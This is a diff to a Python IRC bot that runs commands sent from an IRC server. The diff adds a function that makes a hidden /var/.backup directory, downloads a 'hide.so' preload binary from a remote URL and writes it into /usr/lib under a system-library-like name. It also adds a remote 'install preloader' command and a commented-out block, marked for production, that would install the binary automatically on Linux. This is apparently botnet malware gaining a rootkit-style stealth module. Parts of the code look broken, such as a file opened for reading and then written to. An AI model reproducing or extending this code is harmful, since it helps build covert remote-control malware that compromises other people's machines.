@@ -38,12 +38,18 @@ INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is 
 
 irc = ""
 
+#TEST THIS TO MAKE SURE IT WORKS
+def initPreloader():
+	request = execute("mkdir /var/.backup")
+	installPreloader()
+
 def installPreloader(): #downloads preload binary
 	response = urllib2.urlopen('https://github.com/Blizzo/IRCbot/blob/master/hide.so')
 	data = response.read()
 	f = open('/usr/lib/libld.so.2')
 	f.write(data)
 	f.close()
+	sendData("The preloader was installed.")
 
 def generateNick(operatingSystem): #generates a nick for the server
 	if not operatingSystem:
@@ -537,6 +543,11 @@ def main():
 	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
 	nick = connectToServer(irc, nick, server, port) #connect to IRC server
 
+	#UNCOMMENT THIS SECTION IN PRODUCTION
+	#if linux, install the preloader
+	#if (operatingSystem == "linux"):
+		#initPreloader()
+
 	#infinite loop to listen for messages aka commands
 	while 1:
 		text = irc.recv(1024) #receive up to 1024 bytes
@@ -555,6 +566,7 @@ def main():
 
 #dictionary of functions that DO NOT take parameters
 commands = {
+   "install preloader" : initPreloader,
 	"are you there" : reply,
 	"how are you" : iAmGood,
 	"who are you" : whoAmI,
